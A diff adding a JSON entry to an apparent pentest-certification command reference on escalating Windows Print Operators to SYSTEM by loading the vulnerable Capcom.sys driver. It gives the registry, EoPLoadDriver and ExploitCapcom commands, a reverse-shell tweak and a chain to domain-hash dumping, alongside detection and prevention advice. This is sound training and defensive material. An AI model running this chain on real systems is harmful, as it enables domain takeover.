@@ -1,0 +1,94 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "eoploaddriver",
+    "exploitcapcom"
+  ],
+  "tags": [
+    "seloaddriver",
+    "print-operators",
+    "driver"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Print Operators",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Point a CAPCOM registry entry at the vulnerable driver",
+      "command": "reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\Tools\\Capcom.sys\"\nreg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1"
+    },
+    {
+      "label": "Enable SeLoadDriverPrivilege and load the driver",
+      "command": "EoPLoadDriver.exe System\\CurrentControlSet\\Capcom c:\\Tools\\Capcom.sys"
+    },
+    {
+      "label": "Exploit the loaded Capcom driver for a SYSTEM shell",
+      "command": ".\\ExploitCapcom.exe"
+    },
+    {
+      "label": "Clean up the registry key",
+      "command": "reg delete HKCU\\System\\CurrentControlSet\\Capcom"
+    }
+  ],
+  "notes": "=== Print Operators — SeLoadDriverPrivilege → Kernel Exploit → SYSTEM ===\nPrint Operators get SeLoadDriverPrivilege — load Capcom.sys signed driver → SYSTEM on DC.\n\n=== PRIVILEGE AND REQUIREMENTS ===\nSeLoadDriverPrivilege: allows loading/unloading kernel device drivers\nPrint Operators also: manage printers on DCs + log on locally to DCs\nPrivilege is DISABLED in non-elevated context due to UAC → must bypass UAC first\nWindows 10 1803+: HKCU registry references for SeLoadDriverPrivilege are BLOCKED — technique mostly applies to older DCs\n\n=== CAPCOM.SYS ATTACK CHAIN ===\nCapcom.sys: vulnerable SIGNED driver with function to execute arbitrary shellcode as SYSTEM.\nSigned = loads without kernel code signing bypass needed.\n\nStep 1: Compile privilege enabler\n  Modify EnableSeLoadDriverPrivilege.cpp (correct Windows headers)\n  cl.exe from VS Developer Command Prompt\n\nStep 2: Register driver in HKCU registry (user-owned key — no admin needed for HKCU)\n  reg add \"HKCU\\System\\CurrentControlSet\\Capcom\" /v ImagePath /t REG_SZ /d \"\\??\\C:\\Tools\\Capcom.sys\"\n  reg add \"HKCU\\System\\CurrentControlSet\\Capcom\" /v Type /t REG_DWORD /d 1\n  \\??\\ = NT Object Path syntax required for NTLoadDriver (resolves full NT object path)\n\nStep 3: Enable privilege and load driver\n  .\\EnableSeLoadDriverPrivilege.exe\n  Verify: DriverView.exe confirms Capcom.sys in kernel\n\nStep 4: Exploit the driver\n  .\\ExploitCapcom.exe\n  → Capcom function executes shellcode → token steal from SYSTEM process → SYSTEM shell\n\n=== AUTOMATED ALTERNATIVE ===\nEoPLoadDriver.exe <HKCU_reg_path> <driver_file_path>\nConsolidates steps 2-3 into single command.\nThen run ExploitCapcom.exe.\n\n=== NO GUI MODIFICATION ===\nEdit ExploitCapcom.cpp line 292: replace \"cmd.exe\" with reverse shell binary path\nRecompile before transfer for non-interactive shell delivery\n\n=== CLEANUP ===\nreg delete \"HKCU\\System\\CurrentControlSet\\Capcom\" /f\n\n=== CHAINING CONTEXT ===\nPrint Operators → UAC bypass (UACMe or srrstr DLL) → elevated shell → Capcom → SYSTEM on DC\nSYSTEM on DC → secretsdump → domain hashes → golden ticket\nSeLoadDriverPrivilege + other vulnerable signed drivers (not just Capcom) = same result",
+  "references": [
+    {
+      "title": "EoPLoadDriver (TarlogicSecurity)",
+      "url": "https://github.com/TarlogicSecurity/EoPLoadDriver/"
+    },
+    {
+      "title": "ExploitCapcom (tandasat)",
+      "url": "https://github.com/tandasat/ExploitCapcom"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "winpe-user-group-enum",
+      "note": "Confirms Print Operators / SeLoadDriverPrivilege.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "printoperators-loaddriver",
+  "name": "Print Operators - SeLoadDriver Capcom Abuse",
+  "command": "EoPLoadDriver.exe System\\CurrentControlSet\\Capcom c:\\Tools\\Capcom.sys",
+  "description": "Print Operators hold SeLoadDriverPrivilege. Load the vulnerable Capcom.sys driver via a HKCU registry reference, then run ExploitCapcom to execute a shell as SYSTEM. EoPLoadDriver automates the registry+load steps.",
+  "opsec": "loud",
+  "mitre": [
+    "T1068"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Print Operators can log on locally to Domain Controllers and hold the SeLoadDriverPrivilege. This privilege allows loading kernel-mode drivers. By loading the vulnerable Capcom.sys driver (which exposes a controlled kernel-mode execution primitive), an attacker can escalate to SYSTEM on the DC. The EoPLoadDriver tool and ExploitCapcom exploit this chain.",
+    "prerequisites": "Membership in Print Operators group. SeLoadDriverPrivilege granted. Target must be running a Windows version where the Capcom.sys exploit is applicable. Ability to write a registry key under HKCU for driver path.",
+    "impact": "Kernel-level code execution as SYSTEM on the Domain Controller. Full domain compromise — can dump NTDS.dit, add Domain Admins, disable defenses.",
+    "detection": "Driver load events in System event log (Event ID 7045). Registry key creation under HKCU\\System\\CurrentControlSet\\ by non-admin. Suspicious .sys files in tool directories. ExploitCapcom process execution.",
+    "artifacts": "System event log: Capcom driver loaded (Event 7045) | Registry: HKCU\\System\\CurrentControlSet\\CAPCOM created | Process: EnableSeLoadDriverPrivilege.exe and ExploitCapcom.exe executed",
+    "prevention": "Audit Print Operators group membership — treat it as equivalent to Domain Admin on DCs. Restrict local logon to DCs via Group Policy (Allow log on locally). Consider removing SeLoadDriverPrivilege from Print Operators where not required. Block known vulnerable drivers (Capcom.sys) via Windows Defender Application Control (WDAC) policy.",
+    "misconfiguration": "Accounts unnecessarily added to Print Operators group. SeLoadDriverPrivilege not restricted via GPO. No WDAC policy blocking vulnerable signed drivers.",
+    "vulnerable_config": "# User in Print Operators\nwhoami /groups | findstr 'Print Operators'\n\n# Exploit chain:\nreg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d '\\\\??\\\\C:\\Tools\\Capcom.sys'\nEnableSeLoadDriverPrivilege.exe\nEoPLoadDriver.exe System\\CurrentControlSet\\Capcom c:\\Tools\\Capcom.sys\n.\\ExploitCapcom.exe",
+    "secure_config": "# Audit Print Operators group\nGet-ADGroupMember -Identity 'Print Operators'\n\n# Restrict local DC logon\n# GPO: Computer Configuration > Windows Settings > Security Settings\n#      > Local Policies > User Rights Assignment\n#      > Allow log on locally: Administrators only\n\n# WDAC: block known vulnerable drivers\n# New-CIPolicy -FilePath .\\policy.xml -Level Publisher -Deny",
+    "sources": [
+      "HTB M26",
+      "MITRE T1543.003",
+      "MITRE T1068"
+    ]
+  }
+}
